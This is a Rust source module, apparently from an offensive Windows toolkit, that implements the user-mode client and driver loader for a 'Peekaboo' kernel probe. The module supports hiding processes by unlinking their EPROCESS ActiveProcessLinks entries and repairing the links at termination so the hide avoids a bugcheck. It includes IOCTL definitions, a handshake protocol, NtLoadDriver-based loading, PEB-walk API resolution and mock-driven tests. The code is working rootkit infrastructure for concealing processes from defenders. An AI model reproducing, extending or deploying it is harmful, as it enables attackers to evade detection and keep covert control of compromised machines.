//! PeekabooProbe production seam — user-mode client for the Peekaboo probe
//! driver (`tools/peekaboo-probe/peekaboo_probe.c`).
//!
//! This module is the missing production impl of
//! [`crate::persistence::PeekabooProbe`]: a signed driver running a
//! `PsSetCreateProcessNotifyRoutineEx` callback, spoken to over a small
//! METHOD_BUFFERED IOCTL contract. With a live client,
//! `win::select_pg_window_with_probe` tier 1 (the offset-free
//! `PeekabooWindow`) becomes reachable in production instead of only under
//! the `MockPeekabooProbe` test seam.
//!
//! ## Wire contract (must match `tools/peekaboo-probe/peekaboo_probe.c` exactly)
//! Device: `\Device\PeekabooProbe`, DOS link `\??\PeekabooProbe`
//! (opened from user mode as `\\.\PeekabooProbe`).
//! All IOCTLs are `CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800+n, METHOD_BUFFERED,
//! FILE_ANY_ACCESS)`; all payloads are little-endian fixed-layout structs.
//!
//! | IOCTL                    | code       | in                              | out                                   |
//! |--------------------------|------------|---------------------------------|---------------------------------------|
//! | `HANDSHAKE` (0x222000)   | handshake  | `{u32 magic, u32 version}`      | `{u32 magic, u32 version, u32 caps, u32 status_flags}` |
//! | `STATUS`   (0x222004)    | query      | —                               | `{u32 status_flags, u32 tracked_count}` |
//! | `TRACK`    (0x222008)    | register   | `{u64 eprocess_kva, u64 link_kva}` | `{u32 tracked_count}`              |
//! | `UNTRACK`  (0x22200C)    | remove     | `{u64 eprocess_kva}`            | `{u32 tracked_count}`                 |
//!
//! `status_flags`: bit0 `CALLBACK_REGISTERED` (the notify routine is live →
//! [`PeekabooProbe::repair_armed`]), bit1 `VALIDATION_ACTIVE` (the terminate
//! callback is executing → [`PeekabooProbe::validation_active`]).
//!
//! ## Semantics
//! The driver registers `PsSetCreateProcessNotifyRoutineEx` in `DriverEntry`.
//! When a TRACKed process terminates, the callback fires BEFORE
//! `nt!PspProcessDelete`'s LIST_ENTRY consistency check and performs the
//! Peekaboo repair in kernel context (`entry->Flink->Blink = entry;
//! entry->Blink->Flink = entry`), then removes the entry. The user-mode
//! `PeekabooWindow` Drop repair covers window exit for processes that did
//! NOT terminate; the driver callback covers termination. Both must agree on
//! the link KVA — TRACK takes the exact `EPROCESS + ActiveProcessLinks` KVA
//! the window hid, so no offset is duplicated into the driver.
//!
//! ## Layout / testability
//! The pack/parse layer + the generic [`PeekabooProbeClient`] are pure
//! cross-platform code (host-tested here + integration-tested in
//! `scenarios.rs` against a mock transport emulating the driver's device
//! side). Only the `CreateFileW`/`DeviceIoControl` transport and the
//! `driver_load`-based loader are `cfg(windows)`.

use crate::{KitError, KrwError};
use alloc::vec::Vec;

// ---- Protocol constants (mirror peekaboo_probe.c — change in lockstep) ----

/// Win32 device path for CreateFileW (`\\.\PeekabooProbe`), NUL-terminated.
/// Written as explicit code units to stay const on no_std.
pub const DEVICE_PATH_W: &[u16] = &[
    b'\\' as u16, b'\\' as u16, b'.' as u16, b'\\' as u16, b'P' as u16, b'e' as u16, b'e' as u16,
    b'k' as u16, b'a' as u16, b'b' as u16, b'o' as u16, b'o' as u16, b'P' as u16, b'r' as u16,
    b'o' as u16, b'b' as u16, b'e' as u16, 0,
];

/// Default registry service name for `driver_load` (operator may override).
pub const DEFAULT_SERVICE_NAME: &[u16] = &[
    b'P' as u16, b'e' as u16, b'e' as u16, b'k' as u16, b'a' as u16, b'b' as u16, b'o' as u16,
    b'o' as u16, b'P' as u16, b'r' as u16, b'o' as u16, b'b' as u16, b'e' as u16, 0,
];

/// Handshake magic — ASCII "PKKP" (Peekaboo Kernel Probe), little-endian.
/// The driver echoes it; a wrong echo means the device behind
/// `\\.\PeekabooProbe` is not our driver (name collision / stale load).
pub const PROTOCOL_MAGIC: u32 = 0x504B_4B50;

/// Wire protocol version. Handshake requires an exact match — a driver built
/// against a different contract revision is refused rather than misparsed.
pub const PROTOCOL_VERSION: u32 = 1;

// CTL_CODE(FILE_DEVICE_UNKNOWN=0x22, fn, METHOD_BUFFERED=0, FILE_ANY_ACCESS=0)
//   = (0x22 << 16) | (fn << 2).
/// Handshake / identity + capability exchange. Function 0x800.
pub const IOCTL_PEEKABOO_HANDSHAKE: u32 = 0x22_2000;
/// Live status query (callback registered / validation active). Function 0x801.
pub const IOCTL_PEEKABOO_STATUS: u32 = 0x22_2004;
/// Register a hidden entry for termination-time kernel-side repair. 0x802.
pub const IOCTL_PEEKABOO_TRACK: u32 = 0x22_2008;
/// Remove a tracked entry (after user-mode Drop repair re-linked it). 0x803.
pub const IOCTL_PEEKABOO_UNTRACK: u32 = 0x22_200C;

/// `status_flags` bit0: the `PsSetCreateProcessNotifyRoutineEx` callback is
/// registered. Without it, hiding a process guarantees a 0x139 bugcheck on
/// process exit — `PeekabooWindow` must refuse to open.
pub const STATUS_CALLBACK_REGISTERED: u32 = 0x1;
/// `status_flags` bit1: the terminate callback is executing RIGHT NOW
/// (a guarded `PspProcessDelete` validation is in progress or imminent) —
/// opening the window would race the fast-fail check.
pub const STATUS_VALIDATION_ACTIVE: u32 = 0x2;

/// `capabilities` bit0: the driver performs the LIST_ENTRY repair inside its
/// terminate callback (the whole point of the probe). Mandatory — a driver
/// without it cannot arm the repair path.
pub const CAP_TERMINATION_REPAIR: u32 = 0x1;
/// `capabilities` bit1: the driver tracks the validation-active counter.
/// Advisory; when absent the client conservatively reports
/// `validation_active() = false` only if `status_flags` bit1 is also clear.
pub const CAP_VALIDATION_TRACKING: u32 = 0x2;

/// Maximum entries the driver tracks at once (fixed table in the driver).
pub const MAX_TRACKED: usize = 64;

// ---- Pure pack/parse layer (host-testable) --------------------------------

/// Decoded STATUS reply.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct StatusReply {
    pub status_flags: u32,
    pub tracked_count: u32,
}

/// Decoded HANDSHAKE reply.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct HandshakeReply {
    pub magic: u32,
    pub version: u32,
    pub capabilities: u32,
    pub status_flags: u32,
}

/// Pack a HANDSHAKE request: `{magic, version}` (8 bytes).
pub fn pack_handshake_request() -> [u8; 8] {
    let mut b = [0u8; 8];
    b[0..4].copy_from_slice(&PROTOCOL_MAGIC.to_le_bytes());
    b[4..8].copy_from_slice(&PROTOCOL_VERSION.to_le_bytes());
    b
}

/// Parse a HANDSHAKE reply (16 bytes). Checks the length and the magic echo;
/// the version/capability policy decision is the caller's
/// ([`PeekabooProbeClient::handshake`]).
pub fn parse_handshake_reply(buf: &[u8]) -> Result<HandshakeReply, KrwError> {
    if buf.len() < 16 {
        return Err(KrwError::Other(alloc::format!(
            "peekaboo handshake reply too short ({} < 16)",
            buf.len()
        )));
    }
    let magic = u32::from_le_bytes(buf[0..4].try_into().unwrap());
    if magic != PROTOCOL_MAGIC {
        return Err(KrwError::Unavailable(
            "peekaboo handshake: bad magic echo — device is not our probe driver",
        ));
    }
    Ok(HandshakeReply {
        magic,
        version: u32::from_le_bytes(buf[4..8].try_into().unwrap()),
        capabilities: u32::from_le_bytes(buf[8..12].try_into().unwrap()),
        status_flags: u32::from_le_bytes(buf[12..16].try_into().unwrap()),
    })
}

/// Parse a STATUS reply (8 bytes).
pub fn parse_status_reply(buf: &[u8]) -> Result<StatusReply, KrwError> {
    if buf.len() < 8 {
        return Err(KrwError::Other(alloc::format!(
            "peekaboo status reply too short ({} < 8)",
            buf.len()
        )));
    }
    Ok(StatusReply {
        status_flags: u32::from_le_bytes(buf[0..4].try_into().unwrap()),
        tracked_count: u32::from_le_bytes(buf[4..8].try_into().unwrap()),
    })
}

/// Pack a TRACK request: `{eprocess_kva, link_kva}` (16 bytes). `link_kva`
/// MUST be `eprocess_kva + EprocessOffsets.active_process_links` — the
/// callback repairs exactly this address; a wrong link KVA means the
/// termination validation still bugchecks.
pub fn pack_track_request(eprocess_kva: u64, link_kva: u64) -> [u8; 16] {
    let mut b = [0u8; 16];
    b[0..8].copy_from_slice(&eprocess_kva.to_le_bytes());
    b[8..16].copy_from_slice(&link_kva.to_le_bytes());
    b
}

/// Pack an UNTRACK request: `{eprocess_kva}` (8 bytes).
pub fn pack_untrack_request(eprocess_kva: u64) -> [u8; 8] {
    eprocess_kva.to_le_bytes()
}

/// Parse the shared TRACK/UNTRACK ack (`{tracked_count}`, 4 bytes). A driver
/// that returns fewer bytes is treated as a protocol violation.
pub fn parse_count_ack(buf: &[u8]) -> Result<u32, KrwError> {
    if buf.len() < 4 {
        return Err(KrwError::Other(alloc::format!(
            "peekaboo ack too short ({} < 4)",
            buf.len()
        )));
    }
    Ok(u32::from_le_bytes(buf[0..4].try_into().unwrap()))
}

// ---- Transport seam + generic client --------------------------------------

/// The device-I/O seam: one `DeviceIoControl` equivalent. The production impl
/// ([`DeviceTransport`], Windows-only) wraps an open HANDLE to
/// `\\.\PeekabooProbe`; tests emulate the driver's device side.
pub trait PeekabooTransport {
    /// Send `code` with `input`, receive into `out`; returns the reply length
    /// in bytes (may be less than `out.len()`). A driver-side NTSTATUS failure
    /// surfaces as `Err` (like `DeviceIoControl` returning 0).
    fn ioctl(&self, code: u32, input: &[u8], out: &mut [u8]) -> Result<usize, KrwError>;
}

/// Production-side Peekaboo probe client. Implements
/// [`crate::persistence::PeekabooProbe`] so it plugs directly into
/// `win::select_pg_window_with_probe(build, krw, Some(&client))`.
///
/// Tracks every entry it registers with the driver and UNTRACKs them all on
/// Drop (best-effort), so a dropped client never leaves stale kernel KVAs in
/// the driver's table. Single-threaded operator context — the tracked list
/// uses `RefCell`, same contract as `PeekabooWindow::hidden`.
pub struct PeekabooProbeClient<T: PeekabooTransport> {
    transport: T,
    /// Capability bits from the handshake.
    capabilities: u32,
    /// EPROCESS KVAs currently registered with the driver (for Drop cleanup).
    tracked: core::cell::RefCell<Vec<u64>>,
}

impl<T: PeekabooTransport> PeekabooProbeClient<T> {
    /// Handshake a freshly opened transport: verify the magic echo, require an
    /// exact protocol-version match, and require [`CAP_TERMINATION_REPAIR`]
    /// (a driver that cannot repair in its callback cannot arm the window).
    pub fn handshake(transport: T) -> Result<Self, KrwError> {
        let req = pack_handshake_request();
        let mut out = [0u8; 16];
        let n = transport.ioctl(IOCTL_PEEKABOO_HANDSHAKE, &req, &mut out)?;
        let reply = parse_handshake_reply(&out[..n])?;
        if reply.version != PROTOCOL_VERSION {
            return Err(KrwError::Unavailable(
                "peekaboo handshake: protocol version mismatch — rebuild driver/client in lockstep",
            ));
        }
        if reply.capabilities & CAP_TERMINATION_REPAIR == 0 {
            return Err(KrwError::Unavailable(
                "peekaboo handshake: driver lacks the termination-repair callback — \
                 it cannot arm the Peekaboo window",
            ));
        }
        Ok(Self {
            transport,
            capabilities: reply.capabilities,
            tracked: core::cell::RefCell::new(Vec::new()),
        })
    }

    /// Capability bits from the handshake.
    pub fn capabilities(&self) -> u32 {
        self.capabilities
    }

    /// Live STATUS query.
    fn status(&self) -> Result<StatusReply, KrwError> {
        let mut out = [0u8; 8];
        let n = self.transport.ioctl(IOCTL_PEEKABOO_STATUS, &[], &mut out)?;
        parse_status_reply(&out[..n])
    }

    /// Number of entries the driver currently tracks (diagnostic).
    pub fn tracked_count(&self) -> Result<u32, KrwError> {
        Ok(self.status()?.tracked_count)
    }

    /// Register a hidden entry for the driver's termination-time repair.
    /// Call AFTER [`crate::persistence::PeekabooWindow::unlink_preserving_links`]
    /// so the driver never repairs an entry that is still fully linked.
    ///
    /// `link_kva` must equal `eprocess_kva + offsets.active_process_links`;
    /// both are checked canonical here (a user-range KVA would make the
    /// kernel-side callback dereference garbage → bugcheck).
    pub fn track_hidden(&self, eprocess_kva: u64, link_kva: u64) -> Result<(), KrwError> {
        const KERNEL_SPACE: u64 = 0xFFFF_8000_0000_0000;
        if eprocess_kva < KERNEL_SPACE || link_kva < KERNEL_SPACE {
            return Err(KrwError::UnsupportedPosture(
                "peekaboo track: non-canonical KVA — refusing to hand the driver a bad pointer",
            ));
        }
        if self.tracked.borrow().len() >= MAX_TRACKED {
            return Err(KrwError::UnsupportedPosture(
                "peekaboo track: driver tracking table full (64) — untrack or use fewer hides",
            ));
        }
        let req = pack_track_request(eprocess_kva, link_kva);
        let mut out = [0u8; 4];
        let n = self.transport.ioctl(IOCTL_PEEKABOO_TRACK, &req, &mut out)?;
        parse_count_ack(&out[..n])?;
        self.tracked.borrow_mut().push(eprocess_kva);
        Ok(())
    }

    /// Remove one tracked entry (after the user-mode Drop repair re-linked it,
    /// so the driver doesn't later repair a live list entry). Best-effort:
    /// a driver-side miss just means the entry was already consumed by a
    /// termination callback.
    pub fn untrack(&self, eprocess_kva: u64) {
        let req = pack_untrack_request(eprocess_kva);
        let mut out = [0u8; 4];
        if self
            .transport
            .ioctl(IOCTL_PEEKABOO_UNTRACK, &req, &mut out)
            .is_ok()
        {
            self.tracked
                .borrow_mut()
                .retain(|&e| e != eprocess_kva);
        }
    }
}

impl<T: PeekabooTransport> crate::persistence::PeekabooProbe for PeekabooProbeClient<T> {
    fn validation_active(&self) -> Result<bool, KitError> {
        Ok(self.status()?.status_flags & STATUS_VALIDATION_ACTIVE != 0)
    }

    fn repair_armed(&self) -> Result<bool, KitError> {
        Ok(self.status()?.status_flags & STATUS_CALLBACK_REGISTERED != 0)
    }
}

impl<T: PeekabooTransport> Drop for PeekabooProbeClient<T> {
    fn drop(&mut self) {
        // Best-effort UNTRACK for everything we registered — the driver's
        // table must not outlive our KVAs (a stale entry would be "repaired"
        // into a list that no longer hides anything, or worse, freed pool).
        let entries = self.tracked.borrow_mut().drain(..).collect::<Vec<_>>();
        for eprocess_kva in entries {
            let req = pack_untrack_request(eprocess_kva);
            let mut out = [0u8; 4];
            let _ = self.transport.ioctl(IOCTL_PEEKABOO_UNTRACK, &req, &mut out);
        }
    }
}

// ---- Windows-only device transport + loader -------------------------------

#[cfg(target_os = "windows")]
mod windows_impl {
    use super::*;
    use crate::byovd::DeviceIoControlFn;
    use crate::win::driver_load::LoadedDriver;
    use crate::win::resolve::resolve_sym;
    use core::ffi::c_void;
    use core::ptr;

    type CreateFileWFn = unsafe extern "system" fn(
        name: *const u16,
        access: u32,
        share: u32,
        sa: *mut c_void,
        disp: u32,
        flags: u32,
        template: *mut c_void,
    ) -> *mut c_void;
    type CloseHandleFn = unsafe extern "system" fn(h: *mut c_void) -> i32;
    type GetLastErrorFn = unsafe extern "system" fn() -> u32;

    /// `PeekabooTransport` over an open HANDLE to `\\.\PeekabooProbe`.
    /// Same FFI discipline as `ByovdDriver` (PEB-walk resolution, sync handle).
    pub struct DeviceTransport {
        device: *mut c_void,
        dioctl: DeviceIoControlFn,
    }

    // SAFETY: same argument as `ByovdDriver` — the HANDLE is owned exclusively
    // by this transport and DeviceIoControl on a sync HANDLE is callable from
    // any thread. The operator context is single-threaded.
    unsafe impl Send for DeviceTransport {}
    unsafe impl Sync for DeviceTransport {}

    impl DeviceTransport {
        /// Open the probe device. The driver MUST already be loaded (via
        /// [`load_probe`] or the operator's own `sc create`); this never loads
        /// anything.
        ///
        /// # Safety
        /// Caller guarantees the driver is loaded and its device accessible.
        pub unsafe fn open() -> Result<Self, KrwError> {
            let create_file = unsafe { resolve_sym::<CreateFileWFn>(b"kernel32.dll", b"CreateFileW")? };
            let dioctl = unsafe { resolve_sym::<DeviceIoControlFn>(b"kernel32.dll", b"DeviceIoControl")? };
            // DEVICE_PATH_W is NUL-terminated by construction (const above).
            let h = unsafe {
                create_file(
                    DEVICE_PATH_W.as_ptr(),
                    0x0012_0003, // FILE_READ_DATA|FILE_WRITE_DATA|SYNCHRONIZE
                    0x03,        // FILE_SHARE_READ | FILE_SHARE_WRITE
                    ptr::null_mut(),
                    0x03, // OPEN_EXISTING
                    0,
                    ptr::null_mut(),
                )
            };
            if h as isize == -1 || h.is_null() {
                let gle = unsafe { resolve_sym::<GetLastErrorFn>(b"kernel32.dll", b"GetLastError") }
                    .map(|f| unsafe { f() })
                    .unwrap_or(0);
                return Err(KrwError::Other(alloc::format!(
                    "peekaboo device open failed (Win32 err={}) — is the probe driver loaded?",
                    gle
                )));
            }
            Ok(Self {
                device: h,
                dioctl,
            })
        }
    }

    impl PeekabooTransport for DeviceTransport {
        fn ioctl(&self, code: u32, input: &[u8], out: &mut [u8]) -> Result<usize, KrwError> {
            let mut returned: u32 = 0;
            let ok = unsafe {
                (self.dioctl)(
                    self.device,
                    code,
                    input.as_ptr() as *const c_void,
                    input.len() as u32,
                    out.as_mut_ptr() as *mut c_void,
                    out.len() as u32,
                    &mut returned,
                    ptr::null_mut(),
                )
            };
            if ok == 0 {
                let gle = unsafe { resolve_sym::<GetLastErrorFn>(b"kernel32.dll", b"GetLastError") }
                    .map(|f| unsafe { f() })
                    .unwrap_or(0);
                return Err(KrwError::Other(alloc::format!(
                    "peekaboo ioctl {:#x} failed (Win32 err={})",
                    code,
                    gle
                )));
            }
            Ok(returned as usize)
        }
    }

    impl Drop for DeviceTransport {
        fn drop(&mut self) {
            if let Ok(close) =
                unsafe { resolve_sym::<CloseHandleFn>(b"kernel32.dll", b"CloseHandle") }
            {
                unsafe { close(self.device) };
            }
        }
    }

    /// Open a probe client against an ALREADY-loaded driver (handshake included).
    ///
    /// # Safety
    /// The driver must be loaded and its device accessible; the handshake
    /// verifies it is actually our probe (magic echo + version).
    pub unsafe fn open_probe() -> Result<PeekabooProbeClient<DeviceTransport>, KrwError> {
        let transport = unsafe { DeviceTransport::open()? };
        PeekabooProbeClient::handshake(transport)
    }

    /// Full production seam: load `tools/peekaboo-probe` via the existing
    /// `driver_load` machinery (registry service key + `NtLoadDriver`), open
    /// the device, handshake, and return the live client plus the
    /// `LoadedDriver` (for explicit `unload()` when the engagement ends —
    /// same cleanup contract as the BYOVD path).
    ///
    /// The driver image must be built from `tools/peekaboo-probe/` with the
    /// WDK and signed (test-signing VM or attestation/EV signature) — it
    /// cannot be built on the dev host.
    ///
    /// # Safety
    /// Loads a kernel driver (changes kernel state; a buggy driver bugchecks).
    /// Requires `SeLoadDriverPrivilege`. Authorized targets only.
    pub unsafe fn load_probe(
        sys_path: &[u16],
        svc_name: &[u16],
    ) -> Result<(LoadedDriver, PeekabooProbeClient<DeviceTransport>), KrwError> {
        let loaded = unsafe { LoadedDriver::load(sys_path, svc_name)? };
        // The device object exists by the time NtLoadDriver returns (the
        // driver creates it in DriverEntry, synchronously).
        match unsafe { open_probe() } {
            Ok(client) => Ok((loaded, client)),
            Err(e) => {
                // Handshake/open failed — don't leave a half-armed probe
                // resident; the caller gets a clean Err and no kernel residue.
                let mut loaded = loaded;
                loaded.unload();
                Err(e)
            }
        }
    }
}

#[cfg(target_os = "windows")]
pub use windows_impl::*;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ioctl_codes_match_ctl_code_layout() {
        // CTL_CODE(FILE_DEVICE_UNKNOWN=0x22, fn, METHOD_BUFFERED=0, FILE_ANY_ACCESS=0)
        //   = (0x22 << 16) | (fn << 2) — pin the constants to the formula the
        // C driver uses so the two sides cannot drift.
        let ctl = |f: u32| (0x22u32 << 16) | (f << 2);
        assert_eq!(IOCTL_PEEKABOO_HANDSHAKE, ctl(0x800));
        assert_eq!(IOCTL_PEEKABOO_STATUS, ctl(0x801));
        assert_eq!(IOCTL_PEEKABOO_TRACK, ctl(0x802));
        assert_eq!(IOCTL_PEEKABOO_UNTRACK, ctl(0x803));
    }

    #[test]
    fn handshake_roundtrip_and_magic_check() {
        let req = pack_handshake_request();
        assert_eq!(&req[0..4], &PROTOCOL_MAGIC.to_le_bytes());
        assert_eq!(&req[4..8], &PROTOCOL_VERSION.to_le_bytes());

        // 16-byte reply, correct magic → parses.
        let mut reply = [0u8; 16];
        reply[0..4].copy_from_slice(&PROTOCOL_MAGIC.to_le_bytes());
        reply[4..8].copy_from_slice(&1u32.to_le_bytes());
        reply[8..12].copy_from_slice(&(CAP_TERMINATION_REPAIR | CAP_VALIDATION_TRACKING).to_le_bytes());
        reply[12..16].copy_from_slice(&STATUS_CALLBACK_REGISTERED.to_le_bytes());
        let r = parse_handshake_reply(&reply).unwrap();
        assert_eq!(r.version, 1);
        assert_eq!(r.capabilities & CAP_TERMINATION_REPAIR, CAP_TERMINATION_REPAIR);
        assert_eq!(r.status_flags & STATUS_CALLBACK_REGISTERED, STATUS_CALLBACK_REGISTERED);

        // Wrong magic echo → refused (device-name collision guard).
        reply[0..4].copy_from_slice(&0xDEAD_BEEFu32.to_le_bytes());
        assert!(matches!(
            parse_handshake_reply(&reply),
            Err(KrwError::Unavailable(_))
        ));
        // Short buffer → error, never a partial parse.
        assert!(parse_handshake_reply(&reply[..8]).is_err());
    }

    #[test]
    fn status_and_ack_parsing_bounds() {
        let mut s = [0u8; 8];
        s[0..4].copy_from_slice(&(STATUS_CALLBACK_REGISTERED | STATUS_VALIDATION_ACTIVE).to_le_bytes());
        s[4..8].copy_from_slice(&3u32.to_le_bytes());
        let r = parse_status_reply(&s).unwrap();
        assert_eq!(r.status_flags, 0x3);
        assert_eq!(r.tracked_count, 3);
        assert!(parse_status_reply(&s[..4]).is_err());
        assert!(parse_count_ack(&[1, 0, 0, 0]).unwrap() == 1);
        assert!(parse_count_ack(&[1, 0]).is_err());
    }

    #[test]
    fn track_request_layout_is_eprocess_then_link() {
        let req = pack_track_request(0xFFFF_8000_1111_0000, 0xFFFF_8000_1111_0448);
        assert_eq!(
            u64::from_le_bytes(req[0..8].try_into().unwrap()),
            0xFFFF_8000_1111_0000
        );
        assert_eq!(
            u64::from_le_bytes(req[8..16].try_into().unwrap()),
            0xFFFF_8000_1111_0448
        );
        let un = pack_untrack_request(0xFFFF_8000_1111_0000);
        assert_eq!(u64::from_le_bytes(un), 0xFFFF_8000_1111_0000);
    }

    /// Scripted mock transport: handshake ok, then controllable status flags.
    /// State is shared via `Rc` so the test can inspect the "driver" after the
    /// client is dropped (Drop-cleanup assertions).
    struct ScriptedTransport {
        status_flags: std::rc::Rc<core::cell::Cell<u32>>,
        untracked: std::rc::Rc<core::cell::RefCell<Vec<u64>>>,
    }
    impl PeekabooTransport for ScriptedTransport {
        fn ioctl(&self, code: u32, input: &[u8], out: &mut [u8]) -> Result<usize, KrwError> {
            match code {
                IOCTL_PEEKABOO_HANDSHAKE => {
                    out[0..4].copy_from_slice(&PROTOCOL_MAGIC.to_le_bytes());
                    out[4..8].copy_from_slice(&PROTOCOL_VERSION.to_le_bytes());
                    out[8..12].copy_from_slice(&(CAP_TERMINATION_REPAIR | CAP_VALIDATION_TRACKING).to_le_bytes());
                    out[12..16].copy_from_slice(&self.status_flags.get().to_le_bytes());
                    Ok(16)
                }
                IOCTL_PEEKABOO_STATUS => {
                    out[0..4].copy_from_slice(&self.status_flags.get().to_le_bytes());
                    out[4..8].copy_from_slice(&0u32.to_le_bytes());
                    Ok(8)
                }
                IOCTL_PEEKABOO_TRACK => {
                    assert_eq!(input.len(), 16);
                    out[0..4].copy_from_slice(&1u32.to_le_bytes());
                    Ok(4)
                }
                IOCTL_PEEKABOO_UNTRACK => {
                    assert_eq!(input.len(), 8);
                    self.untracked
                        .borrow_mut()
                        .push(u64::from_le_bytes(input.try_into().unwrap()));
                    out[0..4].copy_from_slice(&0u32.to_le_bytes());
                    Ok(4)
                }
                _ => Err(KrwError::Other("unknown ioctl".into())),
            }
        }
    }

    fn scripted(flags: u32) -> (ScriptedTransport, std::rc::Rc<core::cell::Cell<u32>>, std::rc::Rc<core::cell::RefCell<Vec<u64>>>) {
        let status_flags = std::rc::Rc::new(core::cell::Cell::new(flags));
        let untracked = std::rc::Rc::new(core::cell::RefCell::new(Vec::new()));
        (
            ScriptedTransport {
                status_flags: std::rc::Rc::clone(&status_flags),
                untracked: std::rc::Rc::clone(&untracked),
            },
            status_flags,
            untracked,
        )
    }

    #[test]
    fn client_probe_semantics_follow_status_flags() {
        use crate::persistence::PeekabooProbe;
        let (t, flags, _u) = scripted(STATUS_CALLBACK_REGISTERED);
        let client = PeekabooProbeClient::handshake(t).unwrap();
        assert!(client.repair_armed().unwrap());
        assert!(!client.validation_active().unwrap());

        // Driver reports a terminate callback in flight → validation active.
        flags.set(STATUS_CALLBACK_REGISTERED | STATUS_VALIDATION_ACTIVE);
        assert!(client.validation_active().unwrap());
        assert!(client.repair_armed().unwrap());

        // Callback unregistered → repair disarmed.
        flags.set(0);
        assert!(!client.repair_armed().unwrap());
    }

    #[test]
    fn client_track_untrack_and_drop_cleanup() {
        let (t, _flags, untracked) = scripted(STATUS_CALLBACK_REGISTERED);
        let client = PeekabooProbeClient::handshake(t).unwrap();
        let e = 0xFFFF_8000_1111_0000u64;
        let l = e + 0x448;
        client.track_hidden(e, l).unwrap();
        assert_eq!(client.tracked.borrow().len(), 1);
        // Non-canonical KVAs are refused BEFORE any ioctl.
        assert!(matches!(
            client.track_hidden(0x0000_7FF0_0000_0000, 0x0000_7FF0_0000_0448),
            Err(KrwError::UnsupportedPosture(_))
        ));
        client.untrack(e);
        assert!(client.tracked.borrow().is_empty());
        assert_eq!(untracked.borrow().as_slice(), &[e]);

        // Entries still registered at Drop are untracked best-effort.
        client.track_hidden(e, l).unwrap();
        drop(client);
        assert_eq!(untracked.borrow().as_slice(), &[e, e]);
    }

    #[test]
    fn handshake_refuses_wrong_version_or_missing_repair_cap() {
        struct BadVersion;
        impl PeekabooTransport for BadVersion {
            fn ioctl(&self, _code: u32, _input: &[u8], out: &mut [u8]) -> Result<usize, KrwError> {
                out[0..4].copy_from_slice(&PROTOCOL_MAGIC.to_le_bytes());
                out[4..8].copy_from_slice(&99u32.to_le_bytes()); // wrong version
                out[8..12].copy_from_slice(&CAP_TERMINATION_REPAIR.to_le_bytes());
                Ok(16)
            }
        }
        assert!(matches!(
            PeekabooProbeClient::handshake(BadVersion),
            Err(KrwError::Unavailable(_))
        ));

        struct NoRepair;
        impl PeekabooTransport for NoRepair {
            fn ioctl(&self, _code: u32, _input: &[u8], out: &mut [u8]) -> Result<usize, KrwError> {
                out[0..4].copy_from_slice(&PROTOCOL_MAGIC.to_le_bytes());
                out[4..8].copy_from_slice(&PROTOCOL_VERSION.to_le_bytes());
                out[8..12].copy_from_slice(&0u32.to_le_bytes()); // no capabilities
                Ok(16)
            }
        }
        assert!(matches!(
            PeekabooProbeClient::handshake(NoRepair),
            Err(KrwError::Unavailable(_))
        ));
    }
}
